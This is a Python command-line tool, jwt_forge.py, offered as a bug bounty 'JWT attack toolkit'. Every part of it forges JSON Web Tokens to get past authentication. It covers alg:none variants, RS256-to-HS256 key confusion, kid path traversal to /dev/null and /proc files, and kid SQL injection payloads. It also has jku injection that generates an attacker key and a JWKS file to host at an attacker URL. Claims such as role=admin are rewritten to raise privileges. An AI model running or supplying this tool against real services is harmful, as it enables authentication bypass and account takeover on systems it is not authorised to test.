#!/usr/bin/env python3
"""
jwt_forge.py — JWT attack toolkit for bug bounty hunting

Usage:
  python3 jwt_forge.py <token> --attack none
  python3 jwt_forge.py <token> --attack hs256-pk --pubkey public.pem --set role=admin
  python3 jwt_forge.py <token> --attack kid-traversal --set sub=1
  python3 jwt_forge.py <token> --attack kid-sqli --set admin=true
  python3 jwt_forge.py <token> --attack jku --jku-url https://attacker.com/jwks.json --set role=admin

Requirements: pip install cryptography PyJWT
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
from typing import Optional


def b64d(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    header = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    return header, payload, parts[2]


def encode_jwt(header: dict, payload: dict, signature: bytes = b"") -> str:
    h = b64e(json.dumps(header, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    s = b64e(signature)
    return f"{h}.{p}.{s}"


def hmac_sign(header: dict, payload: dict, secret: bytes) -> str:
    h = b64e(json.dumps(header, separators=(",", ":")).encode())
    p = b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64e(sig)}"


# ─────────────────────────────────────────────────────────────
# Attack: alg:none
# ─────────────────────────────────────────────────────────────

def attack_alg_none(token: str, claim_overrides: dict) -> None:
    header, payload, _ = decode_jwt(token)
    payload.update(claim_overrides)

    print("[*] alg:none variants — try all of these:\n")
    variants = ["none", "None", "NONE", "nOnE", "NoNe"]
    for alg_val in variants:
        h = dict(header)
        h["alg"] = alg_val
        tok = encode_jwt(h, payload)
        print(f"  [{alg_val}]")
        print(f"  {tok}\n")

    # No alg field at all (triggers authlib CVE-2024-37568 if < 1.3.1)
    h = {k: v for k, v in header.items() if k != "alg"}
    tok = encode_jwt(h, payload)
    print(f"  [no_alg_field — triggers CVE-2024-37568 on authlib < 1.3.1]")
    print(f"  {tok}\n")

    print(f"[*] Modified claims: {json.dumps(payload)}")


# ─────────────────────────────────────────────────────────────
# Attack: RS256 → HS256 with public key as HMAC secret
# ─────────────────────────────────────────────────────────────

def attack_hs256_pk(token: str, pubkey_path: str, claim_overrides: dict) -> None:
    header, payload, _ = decode_jwt(token)
    payload.update(claim_overrides)

    with open(pubkey_path, "rb") as f:
        pem_bytes = f.read()

    h = dict(header)
    h["alg"] = "HS256"

    tok = hmac_sign(h, payload, pem_bytes)
    print(f"[*] RS256→HS256 confusion token (public key as HMAC secret):")
    print(f"  {tok}")
    print(f"\n[*] Modified claims: {json.dumps(payload)}")
    print(f"\n[*] If this returns 200: server accepts HS256 signed with RSA public key.")
    print(f"    This means the server uses a vulnerable algorithm-agnostic verifier.")


# ─────────────────────────────────────────────────────────────
# Attack: kid path traversal
# ─────────────────────────────────────────────────────────────

def attack_kid_traversal(token: str, claim_overrides: dict) -> None:
    header, payload, _ = decode_jwt(token)
    payload.update(claim_overrides)

    # (kid_label, kid_value, hmac_secret)
    # /dev/null → empty key, /proc/sys/kernel/randomize_va_space → usually b'2'
    kids = [
        ("dev_null_empty_key", "../../dev/null", b""),
        ("proc_kernel_va", "../../proc/sys/kernel/randomize_va_space", b"2"),
        ("proc_kernel_va_alt", "../../proc/sys/kernel/randomize_va_space", b"0"),
        ("etc_hostname_localhost", "../../etc/hostname", b"localhost\n"),
        ("empty_string", "", b""),
    ]

    print("[*] kid path traversal variants:\n")
    for name, kid_val, secret in kids:
        h = dict(header)
        h["alg"] = "HS256"
        h["kid"] = kid_val
        tok = hmac_sign(h, payload, secret)
        print(f"  [{name}] kid={kid_val!r}, secret={secret!r}")
        print(f"  {tok}\n")


# ─────────────────────────────────────────────────────────────
# Attack: kid SQL injection
# ─────────────────────────────────────────────────────────────

def attack_kid_sqli(token: str, claim_overrides: dict) -> None:
    header, payload, _ = decode_jwt(token)
    payload.update(claim_overrides)

    # All of these inject the literal string 'hacked' as the key via SQL
    sqli_variants = [
        ("union_dual",     "' UNION SELECT 'hacked' FROM dual--",   b"hacked"),
        ("union_1col",     "' UNION SELECT 'hacked'--",             b"hacked"),
        ("union_mysql",    "1' UNION SELECT 'hacked'#",             b"hacked"),
        ("union_postgres", "' UNION SELECT 'hacked'--",             b"hacked"),
        ("nullbyte_dnull", "../../dev/null\x00",                    b""),
    ]

    print("[*] kid SQL injection variants (HMAC secret = injected value):\n")
    for name, kid_val, secret in sqli_variants:
        h = dict(header)
        h["alg"] = "HS256"
        h["kid"] = kid_val
        tok = hmac_sign(h, payload, secret)
        print(f"  [{name}]")
        print(f"  kid = {kid_val!r}")
        print(f"  {tok}\n")


# ─────────────────────────────────────────────────────────────
# Attack: jku injection
# ─────────────────────────────────────────────────────────────

def attack_jku(token: str, jku_url: str, claim_overrides: dict) -> None:
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import serialization, hashes
        import secrets as _secrets
    except ImportError:
        print("Install cryptography: pip install cryptography")
        sys.exit(1)

    header, payload, _ = decode_jwt(token)
    payload.update(claim_overrides)

    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048, backend=default_backend()
    )
    public_key = private_key.public_key()
    pub_numbers = public_key.public_numbers()

    def int_to_b64(n: int) -> str:
        length = (n.bit_length() + 7) // 8
        return b64e(n.to_bytes(length, "big"))

    kid = _secrets.token_hex(8)
    jwks = {
        "keys": [{
            "kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256",
            "n": int_to_b64(pub_numbers.n),
            "e": int_to_b64(pub_numbers.e),
        }]
    }

    h = {"alg": "RS256", "typ": "JWT", "jku": jku_url, "kid": kid}
    h_enc = b64e(json.dumps(h, separators=(",", ":")).encode())
    p_enc = b64e(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h_enc}.{p_enc}".encode()
    sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    forged = f"{h_enc}.{p_enc}.{b64e(sig)}"

    priv_pem = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )

    with open("attacker_private.pem", "wb") as f:
        f.write(priv_pem)

    print(f"[*] jku injection token:")
    print(f"  jku = {jku_url}")
    print(f"  kid = {kid}")
    print(f"  {forged}\n")
    print(f"[*] Host this JWKS at {jku_url}:")
    print(json.dumps(jwks, indent=2))
    print(f"\n[*] Private key saved to: attacker_private.pem")
    print(f"\n[!] Start jwks_server.py if you need a quick JWKS host:")
    print(f"    python3 jwks_server.py --port 8080")
    print(f"\n[*] Modified claims: {json.dumps(payload)}")


# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────

def parse_overrides(args_set: list) -> dict:
    overrides = {}
    if not args_set:
        return overrides
    for kv in args_set:
        k, v = kv.split("=", 1)
        try:
            overrides[k] = json.loads(v)
        except json.JSONDecodeError:
            overrides[k] = v
    return overrides


def main():
    parser = argparse.ArgumentParser(
        description="jwt_forge — Bug Bounty JWT Attack Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("token", help="JWT token to attack")
    parser.add_argument(
        "--attack",
        choices=["none", "hs256-pk", "kid-traversal", "kid-sqli", "jku"],
        default="none",
        help="Attack type (default: none)",
    )
    parser.add_argument("--pubkey", help="Path to PEM public key (for hs256-pk)")
    parser.add_argument("--jku-url", help="Attacker JWKS URL (for jku attack)")
    parser.add_argument(
        "--set",
        nargs="+",
        metavar="KEY=VALUE",
        help="Override claims: --set role=admin sub=1 admin=true exp=9999999999",
    )
    parser.add_argument("--decode", action="store_true", help="Just decode and display the token")

    args = parser.parse_args()

    if args.decode:
        h, p, s = decode_jwt(args.token)
        print(f"Header:  {json.dumps(h, indent=2)}")
        print(f"Payload: {json.dumps(p, indent=2)}")
        print(f"Sig:     {s[:20]}...")
        return

    overrides = parse_overrides(args.set)

    if args.attack == "none":
        attack_alg_none(args.token, overrides)
    elif args.attack == "hs256-pk":
        if not args.pubkey:
            print("--pubkey required for hs256-pk attack")
            sys.exit(1)
        attack_hs256_pk(args.token, args.pubkey, overrides)
    elif args.attack == "kid-traversal":
        attack_kid_traversal(args.token, overrides)
    elif args.attack == "kid-sqli":
        attack_kid_sqli(args.token, overrides)
    elif args.attack == "jku":
        if not args.jku_url:
            print("--jku-url required for jku attack")
            sys.exit(1)
        attack_jku(args.token, args.jku_url, overrides)


if __name__ == "__main__":
    main()
